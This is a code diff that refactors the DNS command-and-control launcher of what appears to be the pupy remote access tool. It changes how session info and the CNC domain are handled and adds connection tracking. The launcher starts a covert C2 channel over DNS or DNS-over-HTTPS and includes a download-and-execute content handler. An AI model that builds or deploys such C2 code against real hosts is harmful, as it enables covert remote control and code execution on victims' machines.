@@ -27,6 +27,7 @@ import subprocess
 import tempfile
 import platform
 
+import pupy
 from network.lib import getLogger
 
 logger = getLogger('dnscnc')
@@ -52,15 +53,10 @@ class DNSCommandClientLauncher(DnsCommandsClient):
         )
 
     def on_session_established(self):
-        import pupy
-        if hasattr(pupy, 'infos'):
-            pupy.infos['spi'] = '{:08x}'.format(self.spi)
+        pupy.client.set_info('spi', '{:08x}'.format(self.spi))
 
     def on_session_lost(self):
-        import pupy
-
-        if hasattr(pupy, 'infos') and 'spi' in pupy.infos:
-            del pupy.infos['spi']
+        pupy.client.unset_info('spi')
 
     def on_downloadexec_content(self, url, action, content):
         self.on_pastelink_content(url, action, content)
@@ -195,6 +191,7 @@ class DNSCommandClientLauncher(DnsCommandsClient):
 class DNSCncLauncher(BaseLauncher):
     ''' Micro command protocol built over DNS infrastructure '''
 
+    name = 'dnscnc'
     credentials = ['DNSCNC_PUB_KEY_V2']
 
     def __init__(self, *args, **kwargs):
@@ -206,8 +203,6 @@ class DNSCncLauncher(BaseLauncher):
 
     def parse_args(self, args):
         self.args = self.arg_parser.parse_args(args)
-        self.set_host(self.args.domain)
-        self.set_transport(None)
 
         self.doh = self.args.doh
         self.ns = self.args.ns
@@ -218,11 +213,11 @@ class DNSCncLauncher(BaseLauncher):
         if self.args is None:
             raise LauncherError('parse_args needs to be called before iterate')
 
-        logger.info('Activating CNC protocol. Domain: %s', self.host)
+        logger.info('Activating CNC protocol. Domain: %s', self.args.domain)
 
         self.pupy = __import__('pupy')
         self.dnscnc = DNSCommandClientLauncher(
-            self.host, self.doh, self.ns, self.qtype, self.ns_timeout)
+            self.args.domain, self.doh, self.ns, self.qtype, self.ns_timeout)
         self.dnscnc.daemon = True
         self.dnscnc.start()
 
@@ -261,12 +256,10 @@ class DNSCncLauncher(BaseLauncher):
 
 
     def iterate(self):
-        import sys
-
         if not self.dnscnc:
             self.activate()
 
-        while not self.exited and not sys.terminated:
+        while not self.exited and not pupy.client.terminated:
             try:
                 connection = self.process()
                 if not connection:
@@ -279,7 +272,6 @@ class DNSCncLauncher(BaseLauncher):
                 logger.debug('stream created, yielding - %s', stream)
 
                 self.dnscnc.stream = stream
-                self.pupy.infos['transport'] = transport
 
                 yield stream
 
@@ -287,7 +279,6 @@ class DNSCncLauncher(BaseLauncher):
                     logger.debug('stream completed - %s', stream)
 
                     self.dnscnc.stream = None
-                    self.pupy.infos['transport'] = None
 
             except Exception, e:
                 logger.exception(e)
@@ -397,7 +388,13 @@ class DNSCncLauncher(BaseLauncher):
             except Exception as e:
                 logger.exception(e)
 
-        if not stream:
+        if stream:
+            self.set_connection_info(hostname, host, port, connection_proxy, transport)
+        else:
             logger.debug('All connection attempt has been failed')
+            self.reset_connection_info()
 
         return stream, transport
+
+    def get_transport(self):
+        return self._current_transport
